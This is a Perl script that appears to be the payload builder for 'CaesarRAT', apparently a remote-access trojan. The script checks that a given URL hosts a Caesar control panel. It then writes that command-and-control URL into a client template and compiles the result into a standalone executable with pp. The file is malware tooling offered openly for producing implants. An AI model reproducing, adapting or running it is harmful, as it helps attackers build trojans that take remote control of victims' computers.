#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use LWP::ConnCache;
use HTTP::Response;

Main();

sub Main {
    my $basename = $ARGV[0] or help();
    my $caesar_url = $ARGV[1] or help();
    my $template_file = 'templates/client.pl.tpl';
    my $output_directory = 'outputs/';
    my $output = 0;
    
    if($basename !~ /(?:\/|\\|\.\.)/) {
        $output = $output_directory . $basename if($basename !~ /(?:\/|\\|\.\.)/);
    } else {
        $output = $basename;
    }
    
    my $output_script = $output . '.pl';
    my $output_bin = $output . '.bin';
    
    if(!-d $output_directory) {
        print "* Creating output directory : $output_directory\n";
        system("mkdir $output_directory");
    }
    
    if($caesar_url =~ /https?:\/\/(?:[^\/]*)\//i) {
        print "* Checking if a CaesarRAT installation is present on $caesar_url\n";
        my $caesar_install = check_url($caesar_url);
        
        if($caesar_install) {
            my $variables = {
                'CAESAR-URL' => $caesar_url,
            };
            print "[+] CaesarRAT installation found.\n\n";
            
            print "* Generating the payload ...\n";
            write_file($output_script, build_payload($template_file, $variables));
            print "[+] Payload generated : $output_script\n";
            
            print "* Compiling the payload ...\n";
            system("pp -v -g $output_script -o $output_bin");
            
            if(-f $output_bin) {
                print "[+] Executable file : $output_bin\n";
            } else {
                print "[-] Error during compilation. Check if pp is correctly installed on your system\n";
            }
        } else {
            print "[!] Warning : CaesarRAT not found on : $caesar_url\n";
            print "\t--> Please verify the url setting\n";
        }
    }
}

sub check_url {
    my ( $url ) = @_;
    my $caesar_install = 0;
    my $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp ftps )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->conn_cache(LWP::ConnCache->new());
    
    my $response = $browser->get($url);
    
    if($response->is_success && $response->content =~ /<title>Caesar<\/title>/) {
        $caesar_install = 1;
    }
    
    return $caesar_install;
}

sub build_payload {
    my ( $template_file, $variables ) = @_;
    
    my @template_content = read_file($template_file);
    my @final_payload = ();
    
    foreach my $line (@template_content) {
        if($line =~ m/__([a-zA-Z0-9\-]+)__/i) {
            my $replacement = "";
            $replacement = $variables->{uc($1)} if(defined($variables->{uc($1)}) && $variables->{uc($1)});
            $line =~ s/__$1__/$replacement/gi;
        }
        push(@final_payload, $line);
    }
    
    return @final_payload;
}

sub read_file {
    my ( $file ) = @_;
    my @final_content = ();
    
    open FILE, $file or die("Couldn't read file : $file\n");
    my @content = <FILE>;
    close FILE;
    
    foreach my $line (@content) {
        chomp $line;
        push(@final_content, $line);
    }
    
    return @final_content;
}

sub write_file {
    my ( $file, @content ) = @_;
    
    open FILE, ">", $file or die("Couldn't write file : $file (" . $@ . ")\n");
    
    foreach my $line (@content) {
        print FILE $line . "\n";
    }
    close FILE;
}

sub help {
    print "Usage: perl $0 <BASENAME> <CAESAR_INSTALL_URL>\n";
    exit;
}
